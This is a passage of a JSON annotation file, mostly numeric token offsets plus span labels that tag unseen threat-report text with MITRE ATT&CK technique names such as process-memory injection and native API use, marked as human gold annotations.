15469], [15470, 15474], [15475, 15482], [15483, 15485], [15486, 15489], [15490, 15494], [15495, 15503], [15504, 15507], [15508, 15516], [15517, 15526], [15526, 15527], [15530, 15531], [15531, 15532], [15532, 15536], [15537, 15539], [15540, 15548], [15548, 15549], [15549, 15557], [15559, 15560], [15560, 15561], [15561, 15565], [15566, 15568], [15575, 15576], [15577, 15578], [15579, 15586], [15587, 15592], [15594, 15602], [15602, 15603], [15603, 15611], [15616, 15620], [15621, 15622], [15622, 15626], [15626, 15627], [15629, 15630], [15630, 15635], [15636, 15640], [15640, 15641], [15641, 15645], [15645, 15646], [15646, 15651], [15653, 15654], [15654, 15655], [15655, 15659], [15660, 15661], [15662, 15670], [15670, 15671], [15671, 15679], [15680, 15682], [15684, 15688], [15688, 15689], [15689, 15693], [15693, 15694], [15694, 15699], [15699, 15700], [15702, 15710], [15710, 15711], [15711, 15719], [15720, 15732], [15736, 15740], [15744, 15749], [15750, 15753], [15754, 15759], [15759, 15760], [15760, 15787], [15788, 15789], [15789, 15797], [15797, 15798], [15798, 15806], [15806, 15808], [15810, 15811], [15811, 15812], [15812, 15816], [15817, 15819], [15820, 15828], [15829, 15831], [15833, 15841], [15841, 15842], [15842, 15850], [15852, 15860], [15860, 15861], [15861, 15869], [15872, 15873], [15873, 15874], [15874, 15878], [15879, 15880], [15883, 15891], [15892, 15894], [15895, 15898], [15899, 15907], [15908, 15912], [15913, 15915], [15916, 15922], [15923, 15924], [15925, 15934], [15935, 15937], [15938, 15942], [15942, 15943], [15943, 15948], [15949, 15952], [15953, 15961], [15962, 15966], [15967, 15969], [15970, 15974], [15975, 15981], [15982, 15984], [15985, 15993], [15994, 15998], [15999, 16001], [16002, 16006], [16007, 16014], [16014, 16015], [16016, 16020], [16021, 16023], [16024, 16028], [16029, 16032], [16033, 16040], [16041, 16043], [16044, 16047], [16048, 16059], [16060, 16066], [16067, 16074], [16075, 16077], [16078, 16081], [16082, 16088], [16089, 16096], [16097, 16105], [16105, 16106], [16107, 16112], [16113, 16118], [16119, 16120], [16121, 16128], [16129, 16131], [16132, 16135], [16136, 16144], [16145, 16147], [16148, 16164], [16165, 16167], [16168, 16172], [16172, 16173], [16173, 16178], [16179, 16181], [16182, 16187], [16188, 16191], [16192, 16196], [16197, 16206], [16207, 16210], [16211, 16218], [16219, 16222], [16223, 16229], [16230, 16232], [16233, 16235], [16236, 16240], [16241, 16248], [16249, 16253], [16254, 16257], [16257, 16258], [16259, 16261], [16262, 16266], [16267, 16269], [16270, 16272], [16273, 16276], [16277, 16280], [16281, 16291], [16292, 16294], [16295, 16302], [16303, 16306], [16307, 16312], [16313, 16321], [16322, 16324], [16325, 16328], [16329, 16333], [16334, 16340], [16340, 16341], [16342, 16347], [16348, 16354], [16355, 16357], [16358, 16361], [16362, 16367], [16368, 16375], [16376, 16384], [16384, 16385], [16386, 16388], [16389, 16392], [16393, 16396], [16397, 16408], [16409, 16417], [16418, 16421], [16422, 16428], [16429, 16433], [16434, 16436], [16437, 16443], [16444, 16447], [16448, 16451], [16452, 16462], [16462, 16463], [16466, 16476], [16477, 16478], [16479, 16482], [16484, 16488], [16488, 16489], [16489, 16493], [16493, 16494], [16494, 16499], [16499, 16500], [16502, 16510], [16510, 16511], [16511, 16519], [16520, 16532], [16536, 16540], [16544, 16549], [16550, 16553], [16554, 16559], [16559, 16560], [16560, 16587], [16588, 16589], [16589, 16597], [16597, 16598], [16598, 16606], [16606, 16608], [16609, 16611], [16611, 16612], [16612, 16620], [16620, 16621], [16621, 16630], [16630, 16631], [16631, 16636], [16636, 16637], [16637, 16663], [16664, 16665], [16665, 16673], [16673, 16679], [16679, 16682], [16682, 16684], [16686, 16687], [16687, 16688], [16688, 16693], [16695, 16700], [16700, 16701], [16701, 16727], [16727, 16728], [16730, 16738], [16738, 16744], [16744, 16747], [16748, 16762], [16764, 16767], [16772, 16775], [16775, 16776], [16776, 16781], [16782, 16785], [16786, 16792], [16792, 16793], [16793, 16814], [16814, 16815], [16815, 16819], [16820, 16821], [16821, 16829], [16829, 16834], [16834, 16838], [16838, 16840], [16841, 16843], [16843, 16844], [16844, 16852], [16852, 16857], [16857, 16878], [16880, 16881], [16881, 16882], [16882, 16886], [16889, 16894], [16894, 16895], [16895, 16921], [16921, 16922], [16922, 16926], [16926, 16927], [16929, 16937], [16937, 16938], [16938, 16946], [16947, 16953], [16963, 16966], [16971, 16974], [16975, 16976], [16976, 16980], [16980, 16981], [16981, 16987], [16987, 16989], [16989, 16996], [16997, 16998], [16998, 17006], [17006, 17007], [17007, 17015], [17015, 17017], [17019, 17022], [17024, 17025], [17025, 17026], [17026, 17030], [17033, 17037], [17037, 17038], [17038, 17044], [17044, 17046], [17046, 17053], [17053, 17054], [17056, 17064], [17064, 17065], [17065, 17073], [17074, 17084], [17090, 17093], [17098, 17103], [17104, 17107], [17108, 17112], [17112, 17113], [17113, 17116], [17116, 17118], [17118, 17121], [17122, 17124], [17124, 17125], [17125, 17133], [17133, 17134], [17134, 17159], [17162, 17169], [17170, 17172], [17173, 17176], [17177, 17182], [17183, 17187], [17188, 17196], [17197, 17202], [17203, 17210], [17211, 17215], [17216, 17219], [17220, 17223], [17224, 17249], [17250, 17257], [17258, 17260], [17261, 17265], [17266, 17268], [17269, 17272], [17273, 17280], [17281, 17289], [17290, 17297], [17297, 17299], [17299, 17307], [17307, 17308], [17309, 17316], [17317, 17321], [17322, 17324], [17325, 17329], [17330, 17337], [17338, 17342], [17343, 17346], [17347, 17356], [17357, 17366], [17367, 17371], [17371, 17372], [17373, 17375], [17376, 17380], [17381, 17389], [17390, 17397], [17398, 17404], [17405, 17408], [17409, 17417], [17417, 17418], [17421, 17422], [17422, 17423], [17423, 17427], [17428, 17429], [17431, 17434], [17436, 17440], [17440, 17441], [17441, 17447], [17447, 17449], [17449, 17456], [17456, 17457], [17457, 17460], [17460, 17461], [17463, 17471], [17471, 17472], [17472, 17480], [17481, 17491], [17497, 17500], [17505, 17510], [17511, 17514], [17515, 17519], [17519, 17520], [17520, 17521], [17521, 17523], [17523, 17526], [17527, 17529], [17529, 17530], [17530, 17538], [17538, 17539], [17539, 17564], [17566, 17567], [17567, 17568], [17568, 17572], [17573, 17575], [17576, 17579], [17580, 17582], [17584, 17592], [17592, 17593], [17593, 17601], [17603, 17611], [17611, 17612], [17612, 17620], [17622, 17623], [17623, 17624], [17624, 17628], [17629, 17630], [17632, 17636], [17636, 17637], [17637, 17643], [17643, 17645], [17645, 17652], [17652, 17653], [17653, 17656], [17656, 17657], [17659, 17667], [17667, 17668], [17668, 17676], [17677, 17685], [17693, 17696], [17701, 17704], [17704, 17707], [17707, 17708], [17710, 17711], [17711, 17712], [17712, 17716], [17719, 17723], [17723, 17724], [17724, 17730], [17730, 17732], [17732, 17739], [17739, 17740], [17740, 17743], [17743, 17744], [17746, 17754], [17754, 17755], [17755, 17763], [17764, 17774], [17780, 17783], [17788, 17791], [17791, 17792], [17792, 17797], [17798, 17801], [17802, 17806], [17806, 17807], [17807, 17810], [17810, 17811], [17812, 17814], [17814, 17815], [17815, 17823], [17823, 17824], [17824, 17849], [17852, 17858], [17859, 17862], [17863, 17869], [17870, 17877], [17878, 17882], [17883, 17886], [17887, 17889], [17890, 17893], [17894, 17899], [17900, 17907], [17907, 17908], [17909, 17912], [17913, 17920], [17921, 17926], [17927, 17932], [17933, 17936], [17937, 17941], [17942, 17949], [17950, 17954], [17955, 17958], [17959, 17963], [17964, 17967], [17968, 17973], [17973, 17974], [17975, 17978], [17979, 17981], [17982, 17986], [17987, 17993], [17994, 17998], [17999, 18001], [18002, 18008], [18009, 18011], [18012, 18015], [18016, 18020], [18021, 18023], [18024, 18027], [18028, 18032], [18033, 18039], [18039, 18040], [18041, 18043], [18044, 18047], [18048, 18052], [18053, 18064], [18065, 18068], [18069, 18075], [18076, 18083], [18084, 18086], [18087, 18093], [18094, 18098], [18099, 18102], [18102, 18103], [18104, 18109], [18110, 18114], [18115, 18117], [18118, 18122], [18123, 18125], [18126, 18127], [18128, 18137], [18138, 18140], [18141, 18147], [18148, 18151], [18152, 18155], [18156, 18159], [18160, 18163], [18164, 18172], [18172, 18173], [18176, 18177], [18177, 18178], [18178, 18182], [18185, 18189], [18189, 18190], [18190, 18196], [18196, 18198], [18198, 18205], [18205, 18206], [18206, 18210], [18210, 18211], [18213, 18221], [18221, 18222], [18222, 18230], [18231, 18239], [18247, 18250], [18255, 18258], [18258, 18259], [18259, 18264], [18265, 18268], [18269, 18273], [18273, 18274], [18274, 18277], [18277, 18278], [18279, 18281], [18281, 18282], [18282, 18290], [18290, 18291], [18291, 18300], [18300, 18301], [18301, 18309], [18309, 18310], [18310, 18317], [18318, 18319], [18319, 18327], [18327, 18330], [18330, 18336], [18336, 18338], [18340, 18341], [18341, 18342], [18342, 18346], [18349, 18353], [18353, 18354], [18354, 18360], [18360, 18362], [18362, 18369], [18369, 18370], [18370, 18374], [18374, 18375], [18377, 18385], [18385, 18386], [18386, 18394], [18395, 18405], [18411, 18414], [18419, 18424], [18425, 18428], [18429, 18433], [18433, 18434], [18434, 18437], [18437, 18439], [18439, 18442], [18443, 18445], [18445, 18446], [18446, 18454], [18454, 18455], [18455, 18480], [18482, 18483], [18483, 18484], [18484, 18488], [18491, 18495], [18495, 18496], [18496, 18502], [18502, 18504], [18504, 18511], [18511, 18512], [18512, 18516], [18516, 18517], [18519, 18527], [18527, 18528], [18528, 18536], [18537, 18547], [18553, 18556], [18561, 18564], [18564, 18565], [18565, 18570], [18571, 18574], [18575, 18579], [18579, 18580], [18580, 18583], [18583, 18584], [18585, 18587], [18587, 18588], [18588, 18596], [18596, 18597], [18597, 18622], [18624, 18625], [18625, 18626], [18626, 18630], [18633, 18637], [18637, 18638], [18638, 18644], [18644, 18646], [18646, 18653], [18653, 18654], [18654, 18658], [18658, 18659], [18661, 18669], [18669, 18670], [18670, 18678], [18679, 18687], [18695, 18698], [18703, 18706], [18706, 18707], [18707, 18712], [18713, 18716], [18717, 18721], [18721, 18722], [18722, 18723], [18723, 18724], [18725, 18727], [18727, 18728], [18728, 18736], [18736, 18737], [18737, 18762], [18764, 18765], [18765, 18766], [18766, 18770], [18771, 18773], [18774, 18790], [18792, 18800], [18800, 18801], [18801, 18809], [18811, 18819], [18820, 18828], [18829, 18837], [18838, 18846], [18848, 18851], [18851, 18852], [18852, 18855], [18856, 18857], [18857, 18858], [18859, 18863], [18863, 18864], [18866, 18869], [18872, 18879], [18880, 18887], [18888, 18898], [18899, 18903], [18904, 18907], [18908, 18914], [18915, 18922], [18923, 18928], [18928, 18929], [18930, 18932], [18933, 18939], [18940, 18944], [18945, 18947], [18948, 18951], [18952, 18955], [18956, 18960], [18961, 18968], [18969, 18976], [18977, 18979], [18980, 18986], [18987, 18991], [18992, 18995], [18996, 18999], [19000, 19004], [19004, 19005], [19006, 19011], [19012, 19024], [19025, 19030], [19030, 19031], [19032, 19035], [19036, 19043], [19044, 19053], [19054, 19058], [19059, 19068], [19069, 19071], [19072, 19078], [19079, 19082], [19082, 19083], [19084, 19088], [19089, 19091], [19092, 19095], [19096, 19105], [19106, 19114], [19114, 19115], [19116, 19118], [19119, 19125], [19126, 19152], [19153, 19158], [19159, 19164], [19165, 19167], [19168, 19172], [19173, 19183], [19184, 19193], [19194, 19196], [19197, 19204], [19205, 19208], [19209, 19217], [19218, 19220], [19221, 19225], [19226, 19229], [19230, 19240], [19240, 19241], [19243, 19255], [19256, 19263], [19264, 19271], [19272, 19276], [19277, 19286], [19287, 19290], [19291, 19296], [19297, 19313], [19314, 19319], [19320, 19322], [19323, 19335], [19336, 19340], [19341, 19343], [19344, 19347], [19348, 19354], [19355, 19358], [19359, 19364], [19365, 19368], [19369, 19375], [19376, 19381], [19382, 19385], [19386, 19392], [19393, 19402], [19403, 19407], [19408, 19417], [19418, 19421], [19422, 19423], [19424, 19428], [19429, 19435], [19436, 19438], [19439, 19446], [19447, 19458], [19459, 19468], [19469, 19474], [19475, 19489], [19490, 19498], [19499, 19509], [19510, 19513], [19514, 19520], [19521, 19528], [19528, 19529], [19530, 19533], [19534, 19540], [19541, 19547], [19548, 19555], [19556, 19559], [19560, 19564], [19565, 19568], [19569, 19580], [19581, 19584], [19585, 19587], [19588, 19593], [19594, 19596], [19597, 19600], [19601, 19610], [19611, 19614], [19614, 19615], [19616, 19627], [19628, 19633], [19634, 19637], [19638, 19646], [19647, 19650], [19651, 19658], [19659, 19665], [19666, 19675], [19676, 19685], [19686, 19690], [19691, 19697], [19698, 19703], [19704, 19706], [19707, 19710], [19711, 19718], [19719, 19730], [19731, 19735], [19735, 19736], [19737, 19748], [19748, 19749], [19750, 19753], [19754, 19760], [19761, 19769], [19770, 19774], [19775, 19777], [19778, 19782], [19783, 19786], [19787, 19789], [19790, 19797], [19798, 19800], [19801, 19811], [19812, 19816], [19817, 19827], [19827, 19828], [19829, 19831], [19832, 19834], [19835, 19842], [19843, 19845], [19846, 19849], [19849, 19850], [19851, 19855], [19856, 19865], [19866, 19869], [19870, 19880], [19881, 19888], [19889, 19891], [19892, 19895], [19896, 19899], [19900, 19902], [19902, 19903], [19904, 19906], [19907, 19908], [19909, 19919], [19920, 19928], [19929, 19933], [19934, 19939], [19940, 19942], [19943, 19950], [19951, 19959], [19960, 19962], [19963, 19973], [19974, 19979], [19980, 19983], [19984, 19987], [19988, 19996], [19997, 20002], [20003, 20006], [20007, 20018], [20018, 20019], [20022, 20027], [20028, 20031], [20032, 20038], [20040, 20046], [20047, 20054], [20071, 20078], [20079, 20088], [20103, 20109], [20110, 20117], [20118, 20120], [20121, 20122], [20123, 20130], [20131, 20140], [20141, 20143], [20144, 20153], [20154, 20162], [20163, 20171], [20172, 20174], [20175, 20188], [20189, 20197], [20197, 20198], [20199, 20206], [20207, 20218], [20218, 20219], [20220, 20227], [20228, 20239], [20240, 20243], [20244, 20253], [20254, 20260], [20261, 20270], [20270, 20271]]}, {"type": "SEGMENT", "hasID": false, "hasSpan": true, "attrs": [{"name": "annotator", "type": "string", "aggregation": null}, {"name": "set", "type": "string", "aggregation": null}, {"name": "status", "type": "string", "aggregation": null}], "annots": [[0, 20272, "lparker", "content", "human gold"]]}, {"type": "Proc Memory (T1055.009)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[612, 691], [2435, 2579], [5987, 6109], [6568, 6699], [11691, 11781], [12630, 12647]]}, {"type": "Native API (T1106)", "hasID": false, "hasSpan": true, "attrs": [{"name": "comment", "type": "string", "aggregation": null}], "annots": [[11833, 11915], [12648, 12690], [13439, 13462]]}], "version": 2}